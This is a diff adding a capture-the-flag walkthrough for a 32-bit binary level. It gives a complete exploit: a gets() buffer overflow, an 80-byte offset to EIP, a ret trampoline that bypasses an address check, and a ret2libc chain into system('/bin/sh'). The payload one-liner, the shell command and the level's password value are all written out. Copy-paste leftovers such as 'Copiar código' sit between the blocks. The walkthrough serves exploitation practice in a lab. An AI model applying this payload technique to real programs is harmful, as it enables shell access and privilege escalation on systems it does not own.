@@ -1,0 +1,206 @@
+# Level 2 – Walkthrough
+
+## 1. Basic Program Behavior
+Running the binary:
+
+./level2
+hello
+hello
+
+sql
+Copiar código
+
+The program simply reads input with `gets()` and prints it back.
+
+We inspect the binary in GDB:
+
+gdb ./level2
+(gdb) disas p
+
+yaml
+Copiar código
+
+Inside `p()` we find:
+
+- a buffer allocated on the stack
+- a call to `gets()` (unsafe and vulnerable)
+- a check that rejects return addresses starting with `0xb`  
+  (addresses in stack or some libc regions)
+
+This means we cannot jump directly to a stack address.  
+We must use a ret2ret technique.
+
+---
+
+## 2. Finding the offset to EIP
+We generate a test payload:
+
+python -c 'print "A"*80 + "BBBB"' > /tmp/payload
+
+csharp
+Copiar código
+
+Run it exactly as you did:
+
+cat /tmp/payload | ./level2
+
+sql
+Copiar código
+
+The result:
+
+Segmentation fault (core dumped)
+
+powershell
+Copiar código
+
+Using GDB:
+
+gdb ./level2
+(gdb) r < /tmp/payload
+
+yaml
+Copiar código
+
+EIP becomes `0x42424242` (`BBBB`).  
+Offset to EIP = 80 bytes.
+
+---
+
+## 3. Choosing a safe trampoline return address
+The program rejects addresses starting with `0xb`.  
+We need a `ret` instruction inside the `.text` segment.
+
+At the end of function `p()`:
+
+0x0804853e: ret
+
+csharp
+Copiar código
+
+This address starts with `0x08`, so it is accepted by the check.
+
+Little-endian:
+
+\x3e\x85\x04\x08
+
+yaml
+Copiar código
+
+This is the first return address we will write.
+
+---
+
+## 4. Getting the address of system()
+In GDB:
+
+(gdb) print system
+
+yaml
+Copiar código
+
+We found:
+
+0xb7e6b060
+
+makefile
+Copiar código
+
+Little-endian:
+
+\x60\xb0\xe6\xb7
+
+yaml
+Copiar código
+
+This becomes the second return address on the stack.
+
+---
+
+## 5. Getting the address of "/bin/sh"
+We search inside libc:
+
+(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
+
+yaml
+Copiar código
+
+Found at:
+
+0xb7f8cc58
+
+makefile
+Copiar código
+
+Little-endian:
+
+\x58\xcc\xf8\xb7
+
+yaml
+Copiar código
+
+---
+
+## 6. Building the final payload
+
+Layout:
+
+"A"*80 # overflow buffer
+RET_trampoline # 0x0804853e
+system() # 0xb7e6b060
+"AAAA" # fake return address for system()
+"/bin/sh" string address # 0xb7f8cc58
+
+sql
+Copiar código
+
+Final payload:
+
+python -c 'print "A"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"' > /tmp/exploit
+
+yaml
+Copiar código
+
+---
+
+## 7. Executing the exploit (your method)
+To keep stdin open:
+
+cat /tmp/exploit - | ./level2
+
+csharp
+Copiar código
+
+This gives an interactive shell with EUID = level3.
+
+whoami
+level3
+
+yaml
+Copiar código
+
+---
+
+## 8. Reading the level3 flag
+The flag is stored in:
+
+/home/user/level3/.pass
+
+arduino
+Copiar código
+
+Simply run:
+
+cat /home/user/level3/.pass
+
+nginx
+Copiar código
+
+This prints the level3 password.
+
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+mathematica
+Copiar código
+
+Level 2 solved.
